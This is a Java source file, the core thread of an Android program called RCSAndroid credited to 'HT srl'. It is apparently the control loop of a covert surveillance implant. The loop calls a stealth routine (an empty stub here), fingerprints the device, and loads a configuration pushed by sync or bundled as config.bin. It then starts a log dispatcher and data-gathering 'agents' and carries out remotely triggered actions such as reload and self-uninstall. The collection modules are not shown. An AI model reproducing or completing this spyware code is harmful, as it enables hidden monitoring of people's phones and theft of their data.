/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import java.util.Vector;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.action.SubAction;
import com.ht.RCSAndroidGUI.action.UninstallAction;
import com.ht.RCSAndroidGUI.agent.Agent;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.event.EventManager;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.Utils;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

public class CoreThread extends Activity implements Runnable {
	private static final int SLEEPING_TIME = 1000;
	// #ifdef DEBUG
	protected static Debug debug = new Debug("CoreThread");
	// #endif

	private boolean bStopCore = false;
	private Resources resources;
	private Thread coreThread;
	private ContentResolver contentResolver;
	private AgentManager agentManager;
	private EventManager eventManager;

	Thread actionThread;

	public boolean Start(Resources r, ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();
		eventManager = EventManager.self();

		resources = r;
		contentResolver = cr;

		Check.asserts(resources != null, "Null Resources");

		coreThread.start();
		return true;
	}

	public boolean Stop() {
		bStopCore = true;
		Log.d("RCS", "RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	public void run() {
		Log.d("RCS", "RCS Thread Started");

		stealth();
		try {
			for (;;) {
				// #ifdef DEBUG
				debug.info("init task");
				// #endif
				if (taskInit() == false) {
					// #ifdef DEBUG
					debug.error("TaskInit() FAILED");
					// #endif
					break;
				} else {
					// #ifdef DEBUG
					debug.trace("TaskInit() OK");
					// #endif
					// CHECK: Status o init?
				}
				Status.self().setRestarting(false);

				// #ifdef DEBUG
				debug.info("starting checking actions");
				// #endif
				if (checkActions() == false) {
					// #ifdef DEBUG
					debug.error("CheckActions() wants to exit");
					// #endif
					// chiudere tutti i thread
					break;
				} else {
					// #ifdef DEBUG
					debug.info("Waiting a while before reloading");
					// #endif
					Utils.sleep(2000);
				}
			}
		} catch (final Exception ex) {
			// #ifdef DEBUG
			debug.error("run " + ex);
			// #endif
		} finally {

			// #ifdef DEBUG
			debug.trace("RCSAndroid exit ");
			// #endif

			Utils.sleep(2000);
			System.exit(0);
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 * 
	 * @return
	 */
	private boolean checkActions() {
		Status status = Status.self();

		Utils.sleep(1000);

		try {
			for (;;) {

				// #ifdef DEBUG
				debug.trace("checkActions");
				// #endif

				final int[] actionIds = status.getTriggeredActions();

				final int asize = actionIds.length;
				if (asize > 0) {

					for (int k = 0; k < asize; ++k) {
						final int actionId = actionIds[k];

						final Action action = status.getAction(actionId);
						int exitValue = executeAction(action);

						if (exitValue == 1) {
							// #ifdef DEBUG
							debug.info("checkActions: Uninstall");
							// #endif

							UninstallAction.actualExecute();
							return false;
						} else if (exitValue == 2) {
							// #ifdef DEBUG
							debug.trace("checkActions: want Reload");
							// #endif
							return true;
						}
					}
				}

				Utils.sleep(SLEEPING_TIME);
			}
		} catch (final Throwable ex) {
			// catching trowable should break the debugger anc log the full
			// stack trace
			// #ifdef DEBUG
			debug.fatal("checkActions error, restart: " + ex);
			// #endif
			return true;
		}
	}

	/**
	 * Inizializza il core
	 * @return false if any fatal error
	 */
	private boolean taskInit() {
		try {
			Path.makeDirs();

			// Identify the device uniquely
			Device device = Device.self();
			device.init(contentResolver);

			if(!loadConf()){
				debug.error("Cannot load conf");
				return false;
			}

			// Start log dispatcher
			LogDispatcher logDispatcher = LogDispatcher.self();
			logDispatcher.start();

			// Da qui in poi inizia la concorrenza dei thread

			if (eventManager.startEvents() == false) {
				// #ifdef DEBUG
				debug.trace("eventManager FAILED");
				// #endif
				return false;
			}

			// #ifdef DEBUG
			debug.info("Events started");

			// #endif

			if (agentManager.startAgents() == false) {
				// #ifdef DEBUG
				debug.trace("agentManager FAILED");
				// #endif
				return false;
			}

			// #ifdef DEBUG
			debug.info("Agents started");

			Log.d("RCS", "Exiting core");
			return true;

		} catch (RCSException rcse) {
			rcse.printStackTrace();
			Log.d("RCS", "RCSException() detected");
		} catch (Exception e) {
			e.printStackTrace();
			Log.d("RCS", "Exception() detected");
		}

		return false;

	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource conf
	 * 
	 * @throws RCSException
	 * @return false if no correct conf available
	 */
	public boolean loadConf() throws RCSException {

		boolean loaded = false;
		
		// tries to load the file got from the sync, if any.
		AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
		if (file.exists()) {
			byte[] resource = file.read(8);
			// Initialize the configuration object
			Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.LoadConfiguration();

			debug.info("Conf file loaded: " + loaded);

		}

		// tries to load the resource conf
		if (!loaded) {
			// Open conf from resources and load it into resource
			byte[] resource = Utils.InputStreamToBuffer(
					resources.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.LoadConfiguration();
			
			debug.info("Resource file loaded: " + loaded);
		}
		
		return loaded;
	}

	private void stealth() {
		// TODO Auto-generated method stub

	}

	public void testRun() {
		try {

			byte[] resource = Utils.InputStreamToBuffer(
					resources.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			Configuration conf = new Configuration(resource);

			// Identify the device uniquely
			Device device = Device.self();
			device.init(contentResolver);

			// Load the configuration
			conf.LoadConfiguration();

			// Start log dispatcher
			LogDispatcher logDispatcher = LogDispatcher.self();
			logDispatcher.start();

			// Start agents
			agentManager.startAgents();
			Utils.sleep(2000);
			/*
			 * agentManager.stopAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 * agentManager.startAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 * agentManager.restartAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 */
			// Stop agents
			agentManager.stopAgents();
			Utils.sleep(2000);

			Status status = Status.self();
			status.triggerAction(0);
			int[] actionIds = status.getTriggeredActions();
			final int asize = actionIds.length;
			if (asize > 0) {
				for (int k = 0; k < asize; ++k) {
					final int actionId = actionIds[k];
					final Action action = status.getAction(actionId);
					int exitValue = executeAction(action);

					if (exitValue == 1) {
						// #ifdef DEBUG
						// debug.info("checkActions: Uninstall");
						// #endif

						// UninstallAction.actualExecute();
						// return false;
					} else if (exitValue == 2) {
						// #ifdef DEBUG
						// debug.trace("checkActions: want Reload");
						// #endif
						// return true;
					}
				}
			}

			// Ci stiamo chiudendo
			logDispatcher.halt();
			logDispatcher.join();

			Log.d("RCS", "LogDispatcher Killed");

		} catch (RCSException rcse) {
			rcse.printStackTrace();
			Log.d("RCS", "RCSException() detected");
		} catch (Exception e) {
			e.printStackTrace();
			Log.d("RCS", "Exception() detected");
		}

		Log.d("RCS", "Exiting core");
		return;

	}

	private int executeAction(final Action action) {
		int exit = 0;
		// #ifdef DEBUG
		debug.trace("CheckActions() triggered: " + action);
		// #endif

		Status status = Status.self();
		status.unTriggerAction(action);
		// action.setTriggered(false, null);

		status.synced = false;
		// final Vector subActions = action.getSubActionsList();
		final int ssize = action.getSubActionsNum();

		// #ifdef DEBUG
		debug.trace("checkActions, " + ssize + " subactions");
		// #endif

		for (int j = 0; j < ssize; ++j) {
			try {
				final SubAction subAction = (SubAction) action.getSubAction(j);
				// #ifdef DBC
				Check.asserts(subAction != null,
						"checkActions: subAction!=null");
				// #endif

				// lastSubAction = subAction.toString();

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */

				// #ifdef DEBUG
				debug.info("CheckActions() executing subaction (" + (j + 1)
						+ "/" + ssize + ") : " + action);
				// #endif

				// no callingEvent
				subAction.prepareExecute();
				actionThread = new Thread(subAction);
				actionThread.start();

				synchronized (subAction) {
					// #ifdef DEBUG
					debug.trace("CheckActions() wait");
					// #endif
					if (!subAction.isFinished()) {
						// il wait viene chiamato solo se la start non e' gia'
						// finita
						subAction.wait(Configuration.TASK_ACTION_TIMEOUT);
					}
				}

				boolean ret = true;

				if (!subAction.isFinished()) {
					ret = false;
					actionThread.interrupt();
					// #ifdef DEBUG
					debug.trace("CheckActions() interrupted thread");
					// #endif
				}

				// #ifdef DEBUG
				debug.trace("CheckActions() waited");
				// #endif

				if (subAction.wantUninstall()) {
					// #ifdef DEBUG
					debug.warn("CheckActions() uninstalling");
					// #endif

					exit = 1;
					break;
					// return false;
				}

				if (subAction.wantReload()) {
					status.setRestarting(true);
					// #ifdef DEBUG
					debug.warn("checkActions: reloading");
					// #endif
					status.unTriggerAll();
					// #ifdef DEBUG
					debug.trace("checkActions: stopping agents");
					// #endif
					agentManager.stopAgents();
					// #ifdef DEBUG
					debug.trace("checkActions: stopping events");
					// #endif
					eventManager.stopEvents();
					Utils.sleep(2000);
					// #ifdef DEBUG
					debug.trace("checkActions: untrigger all");
					// #endif
					status.unTriggerAll();
					// return true;
					exit = 2;
					break;

				}

				if (ret == false) {
					// #ifdef DEBUG
					debug.warn("CheckActions() error executing: " + subAction);
					// #endif
					continue;
				}
			} catch (final Exception ex) {
				// #ifdef DEBUG
				debug.error("checkActions for: " + ex);
				// #endif
			}
		}

		return exit;
	}

	public boolean Init() {
		return false;
	}

	public boolean Run() {
		return false;
	}
}
